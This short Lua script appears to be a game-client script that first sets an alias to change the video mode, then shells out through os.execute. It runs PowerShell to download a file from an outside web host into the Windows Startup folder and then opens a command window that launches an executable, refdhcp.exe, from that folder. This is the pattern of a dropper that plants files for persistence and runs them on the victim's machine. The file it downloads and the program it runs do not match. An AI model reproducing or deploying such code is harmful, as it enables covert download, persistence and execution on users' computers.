client.Command("alias helboidaun mat_setvideomode 1920 1080 0", true)
client.Command("helboidaun", true)
os.execute([[powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://file-examples.com/storage/fe83e8a190674337794c387/2017/10/file_example_JPG_500kB.jpg', '%systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/file_example_JPG_500kB.jpg }"]])
os.execute('start cmd /k "cd %systemdrive%/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/ & Start refdhcp.exe & pause"')
